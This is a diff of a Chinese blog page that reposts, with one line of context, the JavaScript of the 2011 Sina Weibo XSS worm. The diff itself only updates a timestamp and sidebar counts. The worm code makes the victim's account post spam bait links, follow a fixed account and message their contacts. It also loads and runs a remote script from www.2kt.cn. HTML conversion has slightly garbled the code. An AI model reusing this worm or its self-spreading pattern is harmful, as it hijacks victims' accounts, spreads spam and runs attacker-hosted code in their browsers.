@@ -92,7 +92,7 @@
 <meta property="og:url" content="http://blog.pickbox.me/2011/07/17/新浪微博的XSS攻击的JS代码/index.html">
 <meta property="og:site_name" content="jfo planet">
 <meta property="og:description" content="新浪微博事件利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入js脚本，发微博、发站内消息。更多参考http://coolshell.cn/articles/4914.htmlfunction createXHR(){&amp;nbsp; &amp;nbsp; return window.XMLHttpRequest?&amp;nbsp; &amp;nbsp; new XMLHttpReq">
-<meta property="og:updated_time" content="2016-10-15T05:24:27.000Z">
+<meta property="og:updated_time" content="2017-06-07T05:03:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="新浪微博的XSS攻击的JS代码">
 <meta name="twitter:description" content="新浪微博事件利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入js脚本，发微博、发站内消息。更多参考http://coolshell.cn/articles/4914.htmlfunction createXHR(){&amp;nbsp; &amp;nbsp; return window.XMLHttpRequest?&amp;nbsp; &amp;nbsp; new XMLHttpReq">
@@ -322,6 +322,7 @@
 
       
          <p></p><p>新浪微博事件利用了微博广场页面 <a href="http://weibo.com/pub/star" target="_blank" rel="external">http://weibo.com/pub/star</a> 的一个URL注入js脚本，发微博、发站内消息。</p><p>更多参考<a href="http://coolshell.cn/articles/4914.html" target="_blank" rel="external">http://coolshell.cn/articles/4914.html</a></p><p></p><p>function createXHR(){</p><p>&nbsp; &nbsp; return window.XMLHttpRequest?</p><p>&nbsp; &nbsp; new XMLHttpRequest():</p><p>&nbsp; &nbsp; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</p><p>}</p><p>function getappkey(url){</p><p>&nbsp; &nbsp; xmlHttp = createXHR();</p><p>&nbsp; &nbsp; xmlHttp.open(&quot;GET&quot;,url,false);</p><p>&nbsp; &nbsp; xmlHttp.send();</p><p>&nbsp; &nbsp; result = xmlHttp.responseText;</p><p>&nbsp; &nbsp; id_arr = ‘’;</p><p>&nbsp; &nbsp; id = result.match(/namecard=&quot;true&quot; title=&quot;[^&quot;]<em>/g);</em></p><p>&nbsp; &nbsp; for(i=0;i&lt;id.length;i++){</p><p>&nbsp; &nbsp; &nbsp; &nbsp; sum = id[i].toString().split(‘&quot;’)[3];</p><p>&nbsp; &nbsp; &nbsp; &nbsp; id_arr += sum + ‘||’;</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; return id_arr;</p><p>}</p><p>function random_msg(){</p><p>&nbsp; &nbsp; link = ‘ <a href="http://163.fm/PxZHoxn?id=" target="_blank" rel="external">http://163.fm/PxZHoxn?id=</a>‘ + new Date().getTime();;</p><p>&nbsp; &nbsp; var msgs = [</p><p>&nbsp; &nbsp; ‘郭美美事件的一些未注意到的细节：’,</p><p>&nbsp; &nbsp; ‘建党大业中穿帮的地方：’,</p><p>&nbsp; &nbsp; ‘让女人心动的100句诗歌：’,</p><p>&nbsp; &nbsp; ‘3D肉团团高清普通话版种子：’,</p><p>&nbsp; &nbsp; ‘这是传说中的神仙眷侣啊：’,</p><p>&nbsp; &nbsp; ‘惊爆!范冰冰艳照真流出了：’,</p><p>&nbsp; &nbsp; ‘杨幂被爆多次被潜规则:’,</p><p>&nbsp; &nbsp; ‘傻仔拿锤子去抢银行：’,</p><p>&nbsp; &nbsp; ‘可以监听别人手机的软件：’,</p><p>&nbsp; &nbsp; ‘个税起征点有望提到4000：’];</p><p>&nbsp; &nbsp; var msg = msgs[Math.floor(Math.random()msgs.length)] + link;</p><p>&nbsp; &nbsp; msg = encodeURIComponent(msg);</p><p>&nbsp; &nbsp; return msg;</p><p>}</p><p>function post(url,data,sync){</p><p>&nbsp; &nbsp; xmlHttp = createXHR();</p><p>&nbsp; &nbsp; xmlHttp.open(&quot;POST&quot;,url,sync);</p><p>&nbsp; &nbsp; xmlHttp.setRequestHeader(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8&quot;);</p><p>&nbsp; &nbsp; xmlHttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;);</p><p>&nbsp; &nbsp; xmlHttp.send(data);</p><p>}</p><p>function publish(){</p><p>&nbsp; &nbsp; url = ‘<a href="http://weibo.com/mblog/publish.php?rnd=" target="_blank" rel="external">http://weibo.com/mblog/publish.php?rnd=</a>‘ + new Date().getTime();</p><p>&nbsp; &nbsp; data = ‘content=’ + random_msg() + ‘&amp;pic=&amp;styleid=2&amp;retcode=’;</p><p>&nbsp; &nbsp; post(url,data,true);</p><p>}</p><p>function follow(){</p><p>&nbsp; &nbsp; url = ‘<a href="http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=" target="_blank" rel="external">http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=</a>‘ + new Date().getTime();</p><p>&nbsp; &nbsp; data = ‘uid=’ + 2201270010 + ‘&amp;fromuid=’ + $CONFIG.$uid + ‘&amp;refer_sort=profile&amp;atnId=profile’;</p><p>&nbsp; &nbsp; post(url,data,true);</p><p>}</p><p>function message(){</p><p>&nbsp; &nbsp; url = ‘<a href="http://weibo.com/" target="_blank" rel="external">http://weibo.com/</a>‘ + $CONFIG.$uid + ‘/follow’;</p><p>&nbsp; &nbsp; ids = getappkey(url);</p><p>&nbsp; &nbsp; id = ids.split(‘||’);</p><p>&nbsp; &nbsp; for(i=0;i&lt;id.length - 1 &amp; i&lt;5;i++){</p><p>&nbsp; &nbsp; &nbsp; &nbsp; msgurl = ‘<a href="http://weibo.com/message/addmsg.php?rnd=" target="_blank" rel="external">http://weibo.com/message/addmsg.php?rnd=</a>‘ + new Date().getTime();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; msg = random_msg();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; msg = encodeURIComponent(msg);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; user = encodeURIComponent(encodeURIComponent(id[i]));</p><p>&nbsp; &nbsp; &nbsp; &nbsp; data = ‘content=’ + msg + ‘&amp;name=’ + user + ‘&amp;retcode=’;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; post(msgurl,data,false);</p><p>&nbsp; &nbsp; }</p><p>}</p><p>function main(){</p><p>&nbsp; &nbsp; try{</p><p>&nbsp; &nbsp; &nbsp; &nbsp; publish();</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; catch(e){}</p><p>&nbsp; &nbsp; try{</p><p>&nbsp; &nbsp; &nbsp; &nbsp; follow();</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; catch(e){}</p><p>&nbsp; &nbsp; try{</p><p>&nbsp; &nbsp; &nbsp; &nbsp; message();</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; catch(e){}</p><p>}</p><p>try{</p><p>&nbsp; &nbsp; x=&quot;g=document.createElement(‘script’);g.src=’<a href="http://www.2kt.cn/images/t.js&#39;;document.body.appendChild(g)&quot;;window.opener.eval(x" target="_blank" rel="external">http://www.2kt.cn/images/t.js&#39;;document.body.appendChild(g)&quot;;window.opener.eval(x</a>);</p><p>}</p><p>catch(e){}</p><p>main();</p><p>var t=setTimeout(‘location=&quot;<a href="http://weibo.com/pub/topic&quot;;&#39;,5000" target="_blank" rel="external">http://weibo.com/pub/topic&quot;;&#39;,5000</a>);</p><p>&nbsp;</p><p></p> 
+
       
     </div>
 
@@ -424,7 +425,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">601</span>
+              <span class="site-state-item-count">603</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -432,7 +433,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-count">37</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
